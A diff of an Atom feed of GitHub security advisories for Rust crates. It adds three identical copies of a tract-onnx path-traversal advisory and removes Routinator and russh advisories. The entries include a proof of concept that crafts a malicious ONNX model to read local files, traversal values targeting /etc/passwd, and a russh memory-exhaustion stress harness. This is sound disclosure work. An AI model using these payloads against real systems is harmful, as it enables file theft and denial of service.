@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/rust.rss</id>
     <title>Security Advisory for Rust crates</title>
-    <updated>2026-06-19T13:04:27.945Z</updated>
+    <updated>2026-06-19T14:59:36.330Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Arust"/>
     <subtitle>Security Advisory for Rust crates on GitHub</subtitle>
@@ -11,6 +11,216 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[tract-onnx] tract: Arbitrary file read via unsanitized ONNX external_data `location` (path traversal) on model load in tract-onnx]]></title>
+        <id>https://github.com/advisories/GHSA-h668-6x6g-f8r5</id>
+        <link href="https://github.com/advisories/GHSA-h668-6x6g-f8r5"/>
+        <updated>2026-06-19T14:45:44.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p><code>tract</code> (the <code>tract-onnx</code> crate) resolves an ONNX tensor's external-data <code>location</code> by joining it onto the model directory <strong>without any sanitization</strong>. Because <code>location</code> comes from the (untrusted) <code>.onnx</code> file, a malicious model can make <code>tract</code> open and read an <strong>arbitrary local file</strong> at load time, with the file's contents flowing into the model's tensors / inference output (read-only file disclosure). This is the ONNX external-data path-traversal class that the reference <code>onnx</code> library hardened over several CVEs; <code>tract</code> resolves <code>location</code> itself and was never hardened.</p>
+<h3 id="details">Details</h3>
+<p>In <code>onnx/src/tensor.rs</code>, <code>get_external_resources()</code> builds the path with no checks:</p>
+<pre><code class="language-rust">let location = /* tensor.external_data "location" value — attacker-controlled */;
+let p = PathBuf::from(path).join(location);          // no is_absolute / ".." / canonicalize / containment check
+provider.read_bytes_from_path(&amp;mut tensor_data, &amp;p, offset, length)?;   // Mmap::map(File::open(p)) by default
+</code></pre>
+<ul>
+<li><code>Path::join</code> with an <strong>absolute</strong> <code>location</code> (e.g. <code>/etc/passwd</code>) discards the base directory → <code>p = /etc/passwd</code>.</li>
+<li>A <strong>relative</strong> <code>../../../../etc/passwd</code> value is not normalized → directory traversal.</li>
+<li>The default <code>MmapDataResolver</code> (<code>onnx/src/data_resolver.rs</code>) then <code>mmap</code>s the file and copies <code>mmap[offset..offset+length]</code> into the tensor. <code>offset</code>/<code>length</code> are also taken from the file; an out-of-range slice <strong>panics</strong> (DoS).</li>
+</ul>
+<p>No <code>is_absolute</code>, <code>..</code>, <code>canonicalize</code>, or containment check exists anywhere on this path (<code>tensor.rs</code>, <code>model.rs</code>, <code>data_resolver.rs</code>).</p>
+<p>Reachable from the standard public API: <code>model_for_path(p)</code> (<code>onnx/src/model.rs</code>) sets <code>model_dir = p.parent()</code> and calls <code>load_tensor(proto, model_dir)</code> → <code>get_external_resources(.., model_dir)</code>.</p>
+<h3 id="poc">PoC</h3>
+<p>Tested on <code>tract-onnx 0.21.16</code> (crates.io), Rust 1.96.</p>
+<ol>
+<li>A canary file the model must not be able to read:
+<code>/tmp/tract_canary_secret.txt</code> → <code>TRACT-EXTDATA-TRAVERSAL-CANARY-7f3a2b</code></li>
+<li>Build a small <code>evil.onnx</code> with a <code>UINT8[37]</code> initializer whose <code>external_data</code> is <code>location=/tmp/tract_canary_secret.txt</code> (absolute), <code>offset=0</code>, <code>length=37</code>, fed through <code>Identity</code> to the output (raw protobuf serialization):</li>
+</ol>
+<pre><code class="language-python">import onnx
+from onnx import helper, TensorProto, StringStringEntryProto
+N = 37; LOC = "/tmp/tract_canary_secret.txt"      # absolute -&gt; Path::join discards the base dir
+w = TensorProto(); w.name = "W"; w.data_type = TensorProto.UINT8
+w.dims.extend([N]); w.data_location = TensorProto.EXTERNAL
+for k, v in [("location", LOC), ("offset", "0"), ("length", str(N))]:
+    e = StringStringEntryProto(); e.key = k; e.value = v; w.external_data.append(e)
+node = helper.make_node("Identity", ["W"], ["Y"])
+out = helper.make_tensor_value_info("Y", TensorProto.UINT8, [N])
+g = helper.make_graph([node], "g", [], [out], initializer=[w])
+m = helper.make_model(g, opset_imports=[helper.make_opsetid("", 13)])
+open("evil.onnx", "wb").write(m.SerializeToString())
+</code></pre>
+<ol start="3">
+<li>Victim loads the untrusted model with the standard API:</li>
+</ol>
+<pre><code class="language-rust">let model = tract_onnx::onnx().model_for_path("evil.onnx")?;
+let out = model.into_optimized()?.into_runnable()?.run(tvec!())?;
+let bytes: Vec&lt;u8&gt; = out[0].to_array_view::&lt;u8&gt;()?.iter().cloned().collect();
+println!("{:?}", String::from_utf8_lossy(&amp;bytes));
+</code></pre>
+<p>Output:</p>
+<pre><code>"TRACT-EXTDATA-TRAVERSAL-CANARY-7f3a2b"
+</code></pre>
+<p>i.e. the contents of the arbitrary local file were read by <code>tract</code> and surfaced in the inference output.</p>
+<h3 id="impact">Impact</h3>
+<p>Read-only arbitrary local file disclosure when an application uses <code>tract</code> to load an untrusted or shared ONNX model (model hubs, multi-file repos, user uploads). The file content is recoverable from the model's tensors / inference output. Secondary: denial of service (panic) via out-of-bounds <code>offset</code>/<code>length</code>. No write or code execution.</p>
+<h3 id="suggested-fix">Suggested fix</h3>
+<p>Reject absolute <code>location</code> and any <code>..</code> component, then canonicalize and verify the resolved path stays within the model directory (mirroring <code>onnx</code> 1.22.0's <code>resolve_external_data_location</code>); reject symlinks; validate <code>offset</code>/<code>length</code> against the file size before slicing.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/sonos/tract/security/advisories/GHSA-h668-6x6g-f8r5">https://github.com/sonos/tract/security/advisories/GHSA-h668-6x6g-f8r5</a></li>
+<li><a href="https://github.com/advisories/GHSA-h668-6x6g-f8r5">https://github.com/advisories/GHSA-h668-6x6g-f8r5</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-h668-6x6g-f8r5</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-06-19T14:45:43.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[tract-onnx] tract: Arbitrary file read via unsanitized ONNX external_data `location` (path traversal) on model load in tract-onnx]]></title>
+        <id>https://github.com/advisories/GHSA-h668-6x6g-f8r5</id>
+        <link href="https://github.com/advisories/GHSA-h668-6x6g-f8r5"/>
+        <updated>2026-06-19T14:45:44.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p><code>tract</code> (the <code>tract-onnx</code> crate) resolves an ONNX tensor's external-data <code>location</code> by joining it onto the model directory <strong>without any sanitization</strong>. Because <code>location</code> comes from the (untrusted) <code>.onnx</code> file, a malicious model can make <code>tract</code> open and read an <strong>arbitrary local file</strong> at load time, with the file's contents flowing into the model's tensors / inference output (read-only file disclosure). This is the ONNX external-data path-traversal class that the reference <code>onnx</code> library hardened over several CVEs; <code>tract</code> resolves <code>location</code> itself and was never hardened.</p>
+<h3 id="details">Details</h3>
+<p>In <code>onnx/src/tensor.rs</code>, <code>get_external_resources()</code> builds the path with no checks:</p>
+<pre><code class="language-rust">let location = /* tensor.external_data "location" value — attacker-controlled */;
+let p = PathBuf::from(path).join(location);          // no is_absolute / ".." / canonicalize / containment check
+provider.read_bytes_from_path(&amp;mut tensor_data, &amp;p, offset, length)?;   // Mmap::map(File::open(p)) by default
+</code></pre>
+<ul>
+<li><code>Path::join</code> with an <strong>absolute</strong> <code>location</code> (e.g. <code>/etc/passwd</code>) discards the base directory → <code>p = /etc/passwd</code>.</li>
+<li>A <strong>relative</strong> <code>../../../../etc/passwd</code> value is not normalized → directory traversal.</li>
+<li>The default <code>MmapDataResolver</code> (<code>onnx/src/data_resolver.rs</code>) then <code>mmap</code>s the file and copies <code>mmap[offset..offset+length]</code> into the tensor. <code>offset</code>/<code>length</code> are also taken from the file; an out-of-range slice <strong>panics</strong> (DoS).</li>
+</ul>
+<p>No <code>is_absolute</code>, <code>..</code>, <code>canonicalize</code>, or containment check exists anywhere on this path (<code>tensor.rs</code>, <code>model.rs</code>, <code>data_resolver.rs</code>).</p>
+<p>Reachable from the standard public API: <code>model_for_path(p)</code> (<code>onnx/src/model.rs</code>) sets <code>model_dir = p.parent()</code> and calls <code>load_tensor(proto, model_dir)</code> → <code>get_external_resources(.., model_dir)</code>.</p>
+<h3 id="poc">PoC</h3>
+<p>Tested on <code>tract-onnx 0.21.16</code> (crates.io), Rust 1.96.</p>
+<ol>
+<li>A canary file the model must not be able to read:
+<code>/tmp/tract_canary_secret.txt</code> → <code>TRACT-EXTDATA-TRAVERSAL-CANARY-7f3a2b</code></li>
+<li>Build a small <code>evil.onnx</code> with a <code>UINT8[37]</code> initializer whose <code>external_data</code> is <code>location=/tmp/tract_canary_secret.txt</code> (absolute), <code>offset=0</code>, <code>length=37</code>, fed through <code>Identity</code> to the output (raw protobuf serialization):</li>
+</ol>
+<pre><code class="language-python">import onnx
+from onnx import helper, TensorProto, StringStringEntryProto
+N = 37; LOC = "/tmp/tract_canary_secret.txt"      # absolute -&gt; Path::join discards the base dir
+w = TensorProto(); w.name = "W"; w.data_type = TensorProto.UINT8
+w.dims.extend([N]); w.data_location = TensorProto.EXTERNAL
+for k, v in [("location", LOC), ("offset", "0"), ("length", str(N))]:
+    e = StringStringEntryProto(); e.key = k; e.value = v; w.external_data.append(e)
+node = helper.make_node("Identity", ["W"], ["Y"])
+out = helper.make_tensor_value_info("Y", TensorProto.UINT8, [N])
+g = helper.make_graph([node], "g", [], [out], initializer=[w])
+m = helper.make_model(g, opset_imports=[helper.make_opsetid("", 13)])
+open("evil.onnx", "wb").write(m.SerializeToString())
+</code></pre>
+<ol start="3">
+<li>Victim loads the untrusted model with the standard API:</li>
+</ol>
+<pre><code class="language-rust">let model = tract_onnx::onnx().model_for_path("evil.onnx")?;
+let out = model.into_optimized()?.into_runnable()?.run(tvec!())?;
+let bytes: Vec&lt;u8&gt; = out[0].to_array_view::&lt;u8&gt;()?.iter().cloned().collect();
+println!("{:?}", String::from_utf8_lossy(&amp;bytes));
+</code></pre>
+<p>Output:</p>
+<pre><code>"TRACT-EXTDATA-TRAVERSAL-CANARY-7f3a2b"
+</code></pre>
+<p>i.e. the contents of the arbitrary local file were read by <code>tract</code> and surfaced in the inference output.</p>
+<h3 id="impact">Impact</h3>
+<p>Read-only arbitrary local file disclosure when an application uses <code>tract</code> to load an untrusted or shared ONNX model (model hubs, multi-file repos, user uploads). The file content is recoverable from the model's tensors / inference output. Secondary: denial of service (panic) via out-of-bounds <code>offset</code>/<code>length</code>. No write or code execution.</p>
+<h3 id="suggested-fix">Suggested fix</h3>
+<p>Reject absolute <code>location</code> and any <code>..</code> component, then canonicalize and verify the resolved path stays within the model directory (mirroring <code>onnx</code> 1.22.0's <code>resolve_external_data_location</code>); reject symlinks; validate <code>offset</code>/<code>length</code> against the file size before slicing.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/sonos/tract/security/advisories/GHSA-h668-6x6g-f8r5">https://github.com/sonos/tract/security/advisories/GHSA-h668-6x6g-f8r5</a></li>
+<li><a href="https://github.com/advisories/GHSA-h668-6x6g-f8r5">https://github.com/advisories/GHSA-h668-6x6g-f8r5</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-h668-6x6g-f8r5</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-06-19T14:45:43.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[tract-onnx] tract: Arbitrary file read via unsanitized ONNX external_data `location` (path traversal) on model load in tract-onnx]]></title>
+        <id>https://github.com/advisories/GHSA-h668-6x6g-f8r5</id>
+        <link href="https://github.com/advisories/GHSA-h668-6x6g-f8r5"/>
+        <updated>2026-06-19T14:45:44.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p><code>tract</code> (the <code>tract-onnx</code> crate) resolves an ONNX tensor's external-data <code>location</code> by joining it onto the model directory <strong>without any sanitization</strong>. Because <code>location</code> comes from the (untrusted) <code>.onnx</code> file, a malicious model can make <code>tract</code> open and read an <strong>arbitrary local file</strong> at load time, with the file's contents flowing into the model's tensors / inference output (read-only file disclosure). This is the ONNX external-data path-traversal class that the reference <code>onnx</code> library hardened over several CVEs; <code>tract</code> resolves <code>location</code> itself and was never hardened.</p>
+<h3 id="details">Details</h3>
+<p>In <code>onnx/src/tensor.rs</code>, <code>get_external_resources()</code> builds the path with no checks:</p>
+<pre><code class="language-rust">let location = /* tensor.external_data "location" value — attacker-controlled */;
+let p = PathBuf::from(path).join(location);          // no is_absolute / ".." / canonicalize / containment check
+provider.read_bytes_from_path(&amp;mut tensor_data, &amp;p, offset, length)?;   // Mmap::map(File::open(p)) by default
+</code></pre>
+<ul>
+<li><code>Path::join</code> with an <strong>absolute</strong> <code>location</code> (e.g. <code>/etc/passwd</code>) discards the base directory → <code>p = /etc/passwd</code>.</li>
+<li>A <strong>relative</strong> <code>../../../../etc/passwd</code> value is not normalized → directory traversal.</li>
+<li>The default <code>MmapDataResolver</code> (<code>onnx/src/data_resolver.rs</code>) then <code>mmap</code>s the file and copies <code>mmap[offset..offset+length]</code> into the tensor. <code>offset</code>/<code>length</code> are also taken from the file; an out-of-range slice <strong>panics</strong> (DoS).</li>
+</ul>
+<p>No <code>is_absolute</code>, <code>..</code>, <code>canonicalize</code>, or containment check exists anywhere on this path (<code>tensor.rs</code>, <code>model.rs</code>, <code>data_resolver.rs</code>).</p>
+<p>Reachable from the standard public API: <code>model_for_path(p)</code> (<code>onnx/src/model.rs</code>) sets <code>model_dir = p.parent()</code> and calls <code>load_tensor(proto, model_dir)</code> → <code>get_external_resources(.., model_dir)</code>.</p>
+<h3 id="poc">PoC</h3>
+<p>Tested on <code>tract-onnx 0.21.16</code> (crates.io), Rust 1.96.</p>
+<ol>
+<li>A canary file the model must not be able to read:
+<code>/tmp/tract_canary_secret.txt</code> → <code>TRACT-EXTDATA-TRAVERSAL-CANARY-7f3a2b</code></li>
+<li>Build a small <code>evil.onnx</code> with a <code>UINT8[37]</code> initializer whose <code>external_data</code> is <code>location=/tmp/tract_canary_secret.txt</code> (absolute), <code>offset=0</code>, <code>length=37</code>, fed through <code>Identity</code> to the output (raw protobuf serialization):</li>
+</ol>
+<pre><code class="language-python">import onnx
+from onnx import helper, TensorProto, StringStringEntryProto
+N = 37; LOC = "/tmp/tract_canary_secret.txt"      # absolute -&gt; Path::join discards the base dir
+w = TensorProto(); w.name = "W"; w.data_type = TensorProto.UINT8
+w.dims.extend([N]); w.data_location = TensorProto.EXTERNAL
+for k, v in [("location", LOC), ("offset", "0"), ("length", str(N))]:
+    e = StringStringEntryProto(); e.key = k; e.value = v; w.external_data.append(e)
+node = helper.make_node("Identity", ["W"], ["Y"])
+out = helper.make_tensor_value_info("Y", TensorProto.UINT8, [N])
+g = helper.make_graph([node], "g", [], [out], initializer=[w])
+m = helper.make_model(g, opset_imports=[helper.make_opsetid("", 13)])
+open("evil.onnx", "wb").write(m.SerializeToString())
+</code></pre>
+<ol start="3">
+<li>Victim loads the untrusted model with the standard API:</li>
+</ol>
+<pre><code class="language-rust">let model = tract_onnx::onnx().model_for_path("evil.onnx")?;
+let out = model.into_optimized()?.into_runnable()?.run(tvec!())?;
+let bytes: Vec&lt;u8&gt; = out[0].to_array_view::&lt;u8&gt;()?.iter().cloned().collect();
+println!("{:?}", String::from_utf8_lossy(&amp;bytes));
+</code></pre>
+<p>Output:</p>
+<pre><code>"TRACT-EXTDATA-TRAVERSAL-CANARY-7f3a2b"
+</code></pre>
+<p>i.e. the contents of the arbitrary local file were read by <code>tract</code> and surfaced in the inference output.</p>
+<h3 id="impact">Impact</h3>
+<p>Read-only arbitrary local file disclosure when an application uses <code>tract</code> to load an untrusted or shared ONNX model (model hubs, multi-file repos, user uploads). The file content is recoverable from the model's tensors / inference output. Secondary: denial of service (panic) via out-of-bounds <code>offset</code>/<code>length</code>. No write or code execution.</p>
+<h3 id="suggested-fix">Suggested fix</h3>
+<p>Reject absolute <code>location</code> and any <code>..</code> component, then canonicalize and verify the resolved path stays within the model directory (mirroring <code>onnx</code> 1.22.0's <code>resolve_external_data_location</code>); reject symlinks; validate <code>offset</code>/<code>length</code> against the file size before slicing.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/sonos/tract/security/advisories/GHSA-h668-6x6g-f8r5">https://github.com/sonos/tract/security/advisories/GHSA-h668-6x6g-f8r5</a></li>
+<li><a href="https://github.com/advisories/GHSA-h668-6x6g-f8r5">https://github.com/advisories/GHSA-h668-6x6g-f8r5</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-h668-6x6g-f8r5</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-06-19T14:45:43.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[tract-nnef] tract-nnef: integer overflow in NNEF `.dat` tensor parser yields an out-of-bounds read on model load]]></title>
         <id>https://github.com/advisories/GHSA-x5mv-8wgw-29hg</id>
@@ -1140,359 +1350,5 @@ echo trusted_paths_hookenv &gt; /tmp/mise-proof.txt
         </author>
         <category label="severity" term="HIGH"/>
         <published>2026-06-08T15:33:00.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[routinator] Routinator has cache path traversal when processing the module component of rsync URIs]]></title>
-        <id>https://github.com/advisories/GHSA-33mj-99mg-8g73</id>
-        <link href="https://github.com/advisories/GHSA-33mj-99mg-8g73"/>
-        <updated>2026-06-12T19:06:11.000Z</updated>
-        <content type="html"><![CDATA[<p>Routinator does not properly check the module component of rsync URIs, which are used to create the file system paths for the Routinator cache. This allows for path traversal by having a module name containing .., potentially providing an attacker access to the entire Routinator rsync cache.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-49233">https://nvd.nist.gov/vuln/detail/CVE-2026-49233</a></li>
-<li><a href="https://www.nlnetlabs.nl/downloads/routinator/CVE-2026-49233.txt">https://www.nlnetlabs.nl/downloads/routinator/CVE-2026-49233.txt</a></li>
-<li><a href="https://github.com/NLnetLabs/routinator/releases/tag/v0.15.2">https://github.com/NLnetLabs/routinator/releases/tag/v0.15.2</a></li>
-<li><a href="https://github.com/advisories/GHSA-33mj-99mg-8g73">https://github.com/advisories/GHSA-33mj-99mg-8g73</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-33mj-99mg-8g73</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-06-08T15:33:00.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[russh] Russh SSH message fields were decoded through allocation-first parsers before field-specific bounds]]></title>
-        <id>https://github.com/advisories/GHSA-4r3c-5hpg-58qr</id>
-        <link href="https://github.com/advisories/GHSA-4r3c-5hpg-58qr"/>
-        <updated>2026-06-11T20:33:22.000Z</updated>
-        <content type="html"><![CDATA[<h1 id="ssh-message-fields-were-decoded-through-allocation-first-parsers-before-field-specific-bounds">SSH message fields were decoded through allocation-first parsers before field-specific bounds</h1>
-<h3 id="summary">Summary</h3>
-<p>Several <code>russh</code> client and server message handlers decoded attacker-controlled SSH strings, name-lists, and byte fields into owned allocations before applying field-specific bounds. A remote SSH peer could send oversized, high-fanout, or malformed length-prefixed fields and make the library allocate, attempt to allocate, or split data before rejecting input that should have been rejected earlier.</p>
-<h3 id="affected-versions">Affected Versions</h3>
-<p>Oldest verified exploitable stable release: <code>russh 0.34.0</code>.</p>
-<ul>
-<li>Historical stronger case: <code>russh &gt;= 0.34.0, &lt; 0.58.0</code>. These releases have the allocation-first KEXINIT field parsing issue and still use <code>CryptoVec</code> for inbound packet/decompression buffers. A peer can combine negotiated RFC <code>zlib</code>, rekey, compressed KEXINIT expansion, historical <code>CryptoVec</code> decompression growth, and KEXINIT name-list fanout.</li>
-<li>Current maintained-line case: <code>russh &gt;= 0.58.0</code>, including <code>0.60.2</code>. These releases moved non-secret packet/decompression buffers off <code>CryptoVec</code>, but the allocation-first SSH field parser issue remains reachable as a <code>Vec</code>/<code>String</code>/name-list resource exhaustion issue.</li>
-</ul>
-<p> Prerelease coverage was not claimed for the zlib/<code>CryptoVec</code>/KEXINIT combo because the combined historical exploit shape was verified against stable <code>v0.34.0</code>-era code and reproduced the stress behavior on <code>v0.57.1</code>.</p>
-<h3 id="details">Details</h3>
-<p>The affected parser pattern appeared across the SSH transport and encrypted-message parser code:</p>
-<ul>
-<li>KEX negotiation parsing</li>
-<li>client encrypted-message parsing</li>
-<li>server encrypted-message parsing</li>
-<li>shared SSH parsing helpers</li>
-</ul>
-<p>Examples of allocation-first field parsing covered by the fix include:</p>
-<ul>
-<li>KEXINIT name-lists</li>
-<li>client <code>USERAUTH_FAILURE</code> method lists</li>
-<li>client <code>USERAUTH_BANNER</code> text fields</li>
-<li>client <code>USERAUTH_PK_OK</code> fields</li>
-<li>client <code>EXT_INFO</code> extension fields</li>
-<li>server <code>SERVICE_REQUEST</code> names</li>
-<li>server <code>USERAUTH_REQUEST</code> header fields</li>
-<li>server password/publickey/keyboard-interactive auth fields, excluding the already-submitted prompt-count issue</li>
-<li>server and client channel/global request names</li>
-<li>server pty, x11, env, exec, subsystem, signal, and forwarding request fields</li>
-<li>channel-open-failure description and language fields</li>
-</ul>
-<p>Before the fix, these handlers generally used <code>ssh_encoding::Decode</code> into <code>String</code>, <code>Bytes</code>, <code>Vec</code>, or <code>NameList</code> first, then validated semantics later. For length-prefixed SSH fields, that means the owned decoder can accept an attacker-controlled length prefix and allocate or attempt allocation before discovering that the packet is truncated or above a local field bound. The fix introduces borrowed bounded parsing helpers such as <code>take_str</code>, <code>take_bytes</code>, and <code>take_name_list</code>.</p>
-<h3 id="rfc--openssh-comparison">RFC / OpenSSH Comparison</h3>
-<p>RFC 4251 section 5 defines SSH <code>string</code> and <code>name-list</code> encodings. RFC 4253 and RFC 4254 then use those encodings throughout KEX, auth, channel, and forwarding messages. The RFC encoding permits large length prefixes, so implementations need local bounds appropriate to their packet and parser model.</p>
-<p>RFC 4251 also says each name inside a <code>name-list</code> is non-empty, cannot contain a comma, and is made of US-ASCII names. RFC 4253 section 7.1 requires the algorithm name-lists in <code>SSH_MSG_KEXINIT</code> to contain at least one algorithm name, while language name-lists may be empty.</p>
-<p>OpenSSH portable commonly parses SSH fields with packet-buffer helpers and then immediately checks message completion:</p>
-<ul>
-<li><code>openssh-portable</code>: <code>kex.c</code>: <code>kex_input_kexinit()</code> / <code>kex_buf2prop()</code></li>
-<li><code>openssh-portable</code>: <code>auth2.c</code>: <code>USERAUTH_REQUEST</code> header parsing</li>
-<li><code>openssh-portable</code>: <code>sshconnect2.c</code>: client auth reply parsing</li>
-<li><code>openssh-portable</code>: <code>serverloop.c</code>: global and channel-open parsing</li>
-<li><code>openssh-portable</code>: <code>session.c</code>: channel request parsing</li>
-<li><code>openssh-portable</code>: <code>packet.c</code>: <code>sshpkt_get_cstring()</code>, <code>sshpkt_get_string()</code>, <code>sshpkt_get_end()</code></li>
-</ul>
-<p><code>openssh-portable</code> was checked at <code>45b30e0a5</code>. OpenSSH generally gets its size safety from the already-bounded packet buffer and <code>sshbuf</code> helpers; it does not always avoid allocating a copied field. The <code>russh</code> patch is stricter in Rust-specific shape by using borrowed bounded helpers where practical, but the protocol alignment is the same: reject oversized or malformed name-lists/strings within a bounded packet parser.</p>
-<h3 id="poc">PoC</h3>
-<p>Inline availability stress PoC: an unauthenticated client sends concurrent <code>SSH_MSG_KEXINIT</code> payloads with a large but packet-sized first name-list containing many small algorithm names. This reaches the server-side initial key-exchange parser before user authentication and drives allocation-heavy owned decoding and name-list splitting. In a local direct-parser stress harness, 512 concurrent connection-equivalent parser workers parsing this payload eight times each raised process memory from about 4 MiB RSS to about 4.45 GiB RSS:</p>
-<pre><code class="language-text">threads=512
-iterations_per_thread=8
-total_iterations=4096
-payload_bytes=262103
-errors=0
-elapsed_ms=5880
-VmRSS: 4056 KiB -&gt; 4661032 KiB
-VmHWM: 4056 KiB -&gt; 4674200 KiB
-</code></pre>
-<p>That concurrency level is material: the multi-GiB result required 512 simultaneous connection-equivalent parser contexts and about 1.02 GiB of total input across the run. The harness exercises the vulnerable pre-auth KEXINIT parser directly rather than opening real sockets, but the parsed bytes are ordinary SSH KEXINIT payload bytes reachable from a remote unauthenticated SSH peer.</p>
-<p>Historical pre-<code>0.58.0</code> amplification note: before <code>0.58.0</code>, inbound packet and decompression buffers still used <code>CryptoVec</code>. To get the stronger historical growth, the peer must negotiate RFC <code>zlib</code> compression, complete the first key exchange, and then send a compressed rekey <code>SSH_MSG_KEXINIT</code> carrying the same high-fanout name-list shape. In a <code>v0.57.1</code> harness, a 652-byte compressed rekey KEXINIT inflated to a 600,103-byte KEXINIT payload, grew the historical <code>CryptoVec</code> decompression output, and then entered the same allocation-heavy KEXINIT name-list parser:</p>
-<pre><code class="language-text">threads=512
-iterations_per_thread=2
-total_iterations=1024
-decompressed_payload_bytes=600103
-compressed_payload_bytes=652
-errors=0
-elapsed_ms=5606
-VmRSS: 5268 KiB -&gt; 1464624 KiB
-VmHWM: 5268 KiB -&gt; 7014560 KiB
-</code></pre>
-<p>The constrained-memory result is useful because it shows where this becomes a service-killing failure rather than only elevated RSS. With the same historical code path, a roughly 1 KiB compressed rekey KEXINIT can force <code>CryptoVec</code> decompression growth into the parser fanout. Under an address-space limit, the process aborted on allocator failure while trying to satisfy one of the intermediate growth allocations:</p>
-<pre><code class="language-text">memory allocation of 262144 bytes failed
-</code></pre>
-<p>That historical result combines the field-parser issue in this report with the pre-<code>0.58.0</code> <code>CryptoVec</code> allocation/growth behavior. The important maintainer takeaway is the amplification shape: very small compressed rekey packets can create much larger historical <code>CryptoVec</code> buffers and then immediately feed the unbounded KEXINIT name-list parser. It is included here to explain historical severity and exploit shape; the separate CryptoVec advisory covers the underlying <code>CryptoVec</code> allocation/growth bug itself.</p>
-<pre><code class="language-rust">#[test]
-fn stress_kexinit_many_names_many_connections() {
-    use std::borrow::Cow;
-    use std::sync::Arc;
-
-    use byteorder::{BigEndian, ByteOrder};
-    use ssh_key::Algorithm;
-
-    use crate::negotiation::{Preferred, Select, Server};
-    use crate::{cipher, compression, kex, mac, msg};
-
-    fn no_crypto_preferred() -&gt; Preferred {
-        Preferred {
-            kex: Cow::Owned(vec![kex::NONE]),
-            key: Cow::Owned(vec![Algorithm::Ed25519]),
-            cipher: Cow::Owned(vec![cipher::NONE]),
-            mac: Cow::Owned(vec![mac::NONE]),
-            compression: Cow::Owned(vec![compression::NONE]),
-        }
-    }
-
-    fn encode_string(buf: &amp;mut Vec&lt;u8&gt;, value: &amp;[u8]) {
-        let mut len = [0; 4];
-        BigEndian::write_u32(&amp;mut len, value.len() as u32);
-        buf.extend_from_slice(&amp;len);
-        buf.extend_from_slice(value);
-    }
-
-    fn kexinit_with_kex_list(kex_list: &amp;str) -&gt; Vec&lt;u8&gt; {
-        let mut payload = Vec::new();
-        payload.push(msg::KEXINIT);
-        payload.extend_from_slice(&amp;[0; 16]);
-        encode_string(&amp;mut payload, kex_list.as_bytes());
-        encode_string(&amp;mut payload, b"ssh-ed25519");
-        encode_string(&amp;mut payload, b"none");
-        encode_string(&amp;mut payload, b"none");
-        encode_string(&amp;mut payload, b"none");
-        encode_string(&amp;mut payload, b"none");
-        encode_string(&amp;mut payload, b"none");
-        encode_string(&amp;mut payload, b"none");
-        encode_string(&amp;mut payload, b"");
-        encode_string(&amp;mut payload, b"");
-        payload.push(0);
-        payload.extend_from_slice(&amp;[0; 4]);
-        payload
-    }
-
-    fn memory_status() -&gt; (Option&lt;usize&gt;, Option&lt;usize&gt;) {
-        let Ok(status) = std::fs::read_to_string("/proc/self/status") else {
-            return (None, None);
-        };
-        let mut rss = None;
-        let mut hwm = None;
-        for line in status.lines() {
-            if let Some(value) = line.strip_prefix("VmRSS:") {
-                rss = value
-                    .split_whitespace()
-                    .next()
-                    .and_then(|value| value.parse().ok());
-            } else if let Some(value) = line.strip_prefix("VmHWM:") {
-                hwm = value
-                    .split_whitespace()
-                    .next()
-                    .and_then(|value| value.parse().ok());
-            }
-        }
-        (rss, hwm)
-    }
-
-    const THREADS: usize = 512;
-    const ITERATIONS_PER_THREAD: usize = 8;
-
-    let payload = Arc::new(kexinit_with_kex_list(
-        &amp;("none,".to_owned() + &amp;"a,".repeat(131_000) + "a"),
-    ));
-    let preferred = Arc::new(no_crypto_preferred());
-    let barrier = Arc::new(std::sync::Barrier::new(THREADS + 1));
-    let before = memory_status();
-    let start = std::time::Instant::now();
-    let mut threads = Vec::new();
-
-    for _ in 0..THREADS {
-        let payload = payload.clone();
-        let preferred = preferred.clone();
-        let barrier = barrier.clone();
-        threads.push(std::thread::spawn(move || {
-            barrier.wait();
-            let mut errors = 0usize;
-            for _ in 0..ITERATIONS_PER_THREAD {
-                if Server::read_kex(&amp;payload, &amp;preferred, None, &amp;kex::KexCause::Initial).is_err() {
-                    errors += 1;
-                }
-            }
-            errors
-        }));
-    }
-
-    barrier.wait();
-    let errors: usize = threads
-        .into_iter()
-        .map(|thread| thread.join().expect("thread"))
-        .sum();
-    let after = memory_status();
-
-    eprintln!(
-        "threads={THREADS} per_thread={ITERATIONS_PER_THREAD} total_iterations={} payload_bytes={} errors={errors} elapsed_ms={} memory_before={before:?} memory_after={after:?}",
-        THREADS * ITERATIONS_PER_THREAD,
-        payload.len(),
